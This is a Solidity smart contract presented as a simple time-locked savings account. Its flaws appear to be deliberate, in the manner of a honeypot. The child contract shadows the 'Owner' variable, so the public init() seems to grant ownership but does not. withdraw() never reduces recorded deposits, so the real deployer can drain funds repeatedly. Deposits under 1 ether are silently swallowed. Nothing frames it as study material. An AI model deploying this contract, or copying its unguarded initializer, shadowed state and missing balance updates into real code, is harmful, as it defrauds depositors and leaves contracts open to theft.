1 //
2 // Licensed under the Apache License, version 2.0.
3 //
4 pragma solidity ^0.4.17;
5 
6 contract Ownable {
7     address public Owner;
8     
9     function Ownable() { Owner = msg.sender; }
10     function isOwner() internal constant returns (bool) { return(Owner == msg.sender); }
11 }
12 
13 contract Savings is Ownable {
14     address public Owner;
15     mapping (address => uint) public deposits;
16     uint public openDate;
17     
18     event Initialized(address indexed Owner, uint OpenDate);
19     event Deposit(address indexed Depositor, uint Amount);
20     event Withdrawal(address indexed Withdrawer, uint Amount);
21     
22     function init(uint open) payable {
23         Owner = msg.sender;
24         openDate = open;
25         Initialized(Owner, open);
26     }
27 
28     function() payable { deposit(); }
29     
30     function deposit() payable {
31         if (msg.value >= 1 ether) {
32             deposits[msg.sender] += msg.value;
33             Deposit(msg.sender, msg.value);
34         }
35     }
36     
37     function withdraw(uint amount) payable {
38         if (isOwner() && now >= openDate) {
39             uint max = deposits[msg.sender];
40             if (amount <= max && max > 0) {
41                 msg.sender.transfer(amount);
42             }
43         }
44     }
45 
46     function kill() payable {
47         if (isOwner() && this.balance == 0) {
48             selfdestruct(msg.sender);
49         }
50 	}
51 }